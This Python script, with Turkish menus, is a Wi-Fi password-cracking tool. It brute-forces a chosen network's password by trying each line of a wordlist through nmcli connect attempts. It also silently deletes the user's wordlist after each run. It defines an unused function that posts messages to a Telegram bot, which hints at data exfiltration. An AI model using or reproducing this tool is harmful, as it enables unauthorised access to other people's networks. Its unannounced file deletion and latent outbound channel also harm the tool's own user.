import subprocess
import requests
import os
import time
from colorama import Fore,Style
user_data = {}

def send_to_telegram(message, token, chat_id):
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    data = {"chat_id": chat_id, "text": message}
    try:
        response = requests.post(url, data=data)
        if response.status_code != 200:
            print(f"Mesaj gönderilemedi. Hata kodu: {response.status_code}")
    except Exception as e:
        print(f"Mesaj gönderilirken hata oluştu: {e}")

def check_wifi_password(ssid, password):
    try:
        result = subprocess.run(
            ['nmcli', 'd', 'wifi', 'connect', ssid, 'password', password],
            capture_output=True, text=True
        )
        return "successfully activated" in result.stdout
    except Exception as e:
        print(f"Hata oluştu: {e}")
        return False

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def display_menu():
    import pyfiglet
    text1=pyfiglet.figlet_format("YIKIM Wİ-Fİ")
    text2=pyfiglet.figlet_format("  CRACK")
    print(Fore.GREEN+Style.BRIGHT+text1,text2+Style.RESET_ALL)
    print("\n=== YIKIM Wi-Fi ŞİFRE CRACK TOOL ===")
    print("1. Ağ Adı Ekle")
    print("2. Şifre Dosyası Ekle")
    print("3. Başlat")
    print("4. Durdur")
    print("5. Çıkış")
    print("==============================")

def save_ssid():
    ssid = input("Lütfen ağ adını girin: ")
    user_data['ssid'] = ssid
    print(f"Ağ adı kaydedildi: {ssid}")

def save_wordlist():
    wordlist_path = input("Lütfen şifre dosyasının (txt) yolunu girin: ")
    if os.path.exists(wordlist_path):
        user_data['wordlist'] = wordlist_path
        print("Dosya kaydedildi.")
    else:
        print("Hata: Belirtilen dosya bulunamadı!")

def start_attack():
    if not user_data.get('ssid') or not user_data.get('wordlist'):
        print("Lütfen önce ağ adı ve şifre dosyasını ekleyin!")
        time.sleep(2)
        return

    ssid = user_data['ssid']
    wordlist_path = user_data['wordlist']
    user_data['running'] = True
    success = 0
    fail = 0

    print(f"\nDeneme başlatılıyor...\nAğ: {ssid}\nDosya: {wordlist_path}")
    with open(wordlist_path, 'r') as file:
        for line in file:
            if not user_data.get('running', False):
                print("\nİşlem durduruldu!")
                break

            password = line.strip()
            print(f"\rBaşarılı: {success} | Başarısız: {fail} | Denenen: {password}", end="")
            if check_wifi_password(ssid, password):
                success += 1
                print(f"\nDoğru şifre bulundu: {password}")
                break
            else:
                fail += 1

    print(f"\n\nDeneme tamamlandı.\nBaşarılı: {success}\nBaşarısız: {fail}")
    if os.path.exists(wordlist_path):
        os.remove(wordlist_path)

    user_data['running'] = False
    user_data['wordlist'] = None
    user_data['ssid'] = None
    input("\nDevam etmek için bir tuşa basın...")

def stop_attack():
    if user_data.get('running'):
        user_data['running'] = False
        print("İşlem durduruldu!")
    else:
        print("Şu anda aktif bir işlem yok!")
    time.sleep(2)

def main():
    while True:
        clear_screen()
        display_menu()
        choice = input("Bir seçenek girin (1-5): ")

        if choice == '1':
            save_ssid()
        elif choice == '2':
            save_wordlist()
        elif choice == '3':
            start_attack()
        elif choice == '4':
            stop_attack()
        elif choice == '5':
            print("Çıkılıyor...")
            break
        else:
            print("Geçersiz seçenek! Lütfen 1-5 arasında bir değer girin.")
            time.sleep(2)

if __name__ == "__main__":
    main()
